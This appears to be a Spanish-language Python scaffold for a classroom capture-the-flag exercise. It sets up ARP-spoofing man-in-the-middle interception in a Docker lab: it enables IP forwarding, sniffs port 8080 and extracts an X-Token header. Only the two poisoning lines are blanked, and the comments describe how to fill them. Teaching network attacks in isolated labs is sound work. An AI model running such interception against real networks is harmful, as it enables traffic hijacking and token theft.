#!/usr/bin/env python3
"""
mitm_ayuda.py — ANDAMIAJE para la Misión 1 (NO es la solución completa).

Te deja casi todo armado: obtener las MAC, el reenvío, el sniff y la lectura
del token. Lo ÚNICO que debes completar son las dos líneas del envenenamiento
ARP (marcadas con TODO). Es exactamente lo del Taller 6.

Córrelo dentro del contenedor 'atacante':
    docker exec -it atacante bash
    cd /reto
    python3 mitm_ayuda.py

Recuerda: la flag sola no da puntos. Entrega también la evidencia (tu .pcap o
este script con tu completado y una captura donde se vea el X-Token).
"""
import os
import threading
import time
from scapy.all import ARP, Raw, send, sniff, getmacbyip

CLIENTE = "172.28.0.20"
SERVIDOR = "172.28.0.10"

# 1) MAC de cada víctima (esto ya funciona).
mac_cli = getmacbyip(CLIENTE)
mac_srv = getmacbyip(SERVIDOR)
print(f"[i] MAC cliente {CLIENTE} = {mac_cli}")
print(f"[i] MAC servidor {SERVIDOR} = {mac_srv}")

# 2) Activar el reenvío para quedar "en medio" sin cortar la conversación.
os.system("sysctl -w net.ipv4.ip_forward=1 >/dev/null")

_stop = False


def envenenar():
    """Repite el envenenamiento cada 2 s. Debes completar las dos líneas.

    Idea (Taller 6): a CADA víctima le dices que TÚ eres la OTRA.
      - Al cliente: 'la IP del servidor (.10) ahora tiene MI MAC'.
      - Al servidor: 'la IP del cliente (.20) ahora tiene MI MAC'.
    Una respuesta ARP se arma con ARP(op=2, psrc=<IP que suplantas>,
    pdst=<IP víctima>, hwdst=<MAC víctima>).
    """
    while not _stop:
        # TODO (1): engañar al CLIENTE para que te crea el SERVIDOR.
        #   send(ARP(op=2, psrc=________, pdst=________, hwdst=________), verbose=0)

        # TODO (2): engañar al SERVIDOR para que te crea el CLIENTE.
        #   send(ARP(op=2, psrc=________, pdst=________, hwdst=________), verbose=0)

        time.sleep(2)


def ver(paquete):
    """Esto ya está listo: cuando pase un paquete con X-Token, lo imprime."""
    if paquete.haslayer(Raw):
        datos = bytes(paquete[Raw].load)
        if b"X-Token" in datos:
            for linea in datos.split(b"\r\n"):
                if linea.startswith(b"X-Token"):
                    token = linea.decode(errors="ignore").split(":", 1)[1].strip()
                    print("\n>>> FLAG 1 (X-Token):", token, "\n")


if __name__ == "__main__":
    hilo = threading.Thread(target=envenenar, daemon=True)
    hilo.start()
    print("[*] Envenenando ARP y escuchando el puerto 8080 (hasta 40 s)...")
    print("[*] Si completaste los TODO, en unos segundos verás el token.")
    sniff(filter="tcp port 8080", prn=ver, store=0, timeout=40)
    _stop = True
    print("[*] Listo. Si no viste el token, revisa los dos TODO del envenenamiento.")
